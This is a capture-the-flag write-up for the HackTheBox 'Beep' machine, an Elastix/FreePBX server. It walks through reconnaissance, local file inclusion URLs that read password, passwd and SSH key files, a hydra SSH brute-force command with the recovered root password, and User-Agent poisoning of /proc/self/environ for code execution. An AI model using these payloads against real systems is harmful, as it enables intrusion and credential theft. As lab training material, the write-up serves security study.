# HackTheBox Beep Writeup

![date](https://img.shields.io/badge/date-01.20.2019-brightgreen.svg)  
![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg)  
![web category](https://img.shields.io/badge/category-web-lightgrey.svg)
![score](https://img.shields.io/badge/score-0-blue.svg)
![solves](https://img.shields.io/badge/solves-2012-brightgreen.svg)

## Summary
You can pop out the box in three ways

    1. Use local file inclusion and get root password and user. 
    2. Modify the local file inclusion exploit to get code execution.
    3. Use PBX exploit.
    4. Use shell shock.

## root flag

## Detailed solution

### nmap target(10.10.10.7)

    > nmap -sC -sV -oA 10.10.10.7

Nmap scan result is as follows (Omit some less used port.): 
    
    Nmap scan report for promote.cache-dns.local (10.10.10.7)
    Host is up (0.29s latency).
    Not shown: 988 closed ports
    PORT      STATE SERVICE    VERSION
    22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
    | ssh-hostkey:
    |   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
    |_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
    25/tcp    open  smtp       Postfix smtpd
    |_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
    80/tcp    open  http       Apache httpd 2.2.3
    |_http-server-header: Apache/2.2.3 (CentOS)
    |_http-title: Did not follow redirect to https://promote.cache-dns.local/
    443/tcp   open  ssl/https?
    10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
    |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
    Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com

### Open web service on port 443 to see if there is anything interesting.

1. See logo and get the software info.
2. Check copyright info to see if outdated.
3. Check source code of web page and see if there is anything about application version.

### Use dirbuster to get detailed info about the web app.

1. Choosing a medium wordlist is fine.
2. Remember to unselect the **Be Recursive** choose form.
3. 10 threads are fine.
4. Or using `dirb https://10.10.10.7/ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -w` cmdline.
5. Open `https://10.10.10.7/admin/`, click **Cancel** and get a Free PBX page. Now you can 
see Free PBX version is **2.8.1.4** and google it with **FreePBX 2.8.1.4 changelog**.
6. Open `https://10.10.10.7/help/`, and check **system/Bakup/Restore** to get some version info.
7. Check logo info.
    1. `curl -k https://10.10.10.7/themes/elastixneo/images/elastix_logo_mini.png -o elastix.png` 
    2. `exiftool elastix.png`

### Search exploits using searchsploit and exploit using local file inclusion.

    > searchsploit elastix
    > searchsploit -x 
    > searchsploit -x exploits/php/webapps/37637.pl


### Collect detailed info on target machine and ssh it.
    
Step 1. Copy the line to ip bar 

    https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action 
then save the possible passwords in amportal.conf file.

Step 2. Replace the file with `/etc/passwd` and get user info on target machine.

    https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action 
then delete the **nologin** user in passwd and save the left.

Step 3. The last step is using hydra to get target ssh login info.
    > hydra -L users -P pw ssh://10.10.10.7

Scanning result:

    [22][ssh] host: 10.10.10.7   login: root   password: jEhdIekWmdjE

**Then you get it!**

### Check ssh configuration files to make it clear if target machine is blocking us.

1. Check `/etc/pam.d/system-auth` file.
2. Check `/etc/fail2ban/jail.conf` file.
3. Check `/proc/self/status` file.
    1. `https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//proc/self/status%00&module=Accounts&action`
    2. Here is the result:
    
           Uid:    100 100 100 100
           Gid:    101 101 101 101
    3. Then check `/etc/passwd` file and get the user associated with the Uid, Gid.`(100:101)`
    4. Next check `/var/lib/asterisk/.ssh/id_rsa` file to get the priv key associated with
    the user.
4. Automatize the scanning file process.    
    1. **Crtl+I** to send intercepted request to intruder.
    2. **Remove $**
    3. **Add $** to pair around the string you want to attack.
    4. Switch to Payloads panel to load payload string files.
    5. Start attack.

### Why is elastix vulnerable?
  
    @include("include/language/$language.lang.php");

### Check `/proc/self/environ` file and change `User-Agent` in request header to get code
    execution.

    1. `https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//proc/self/environ%00&module=Accounts&action`
    2. Change **User-Agent** to `<?php echo "hello"; ?>`
    3. You get code exuction on target machine.
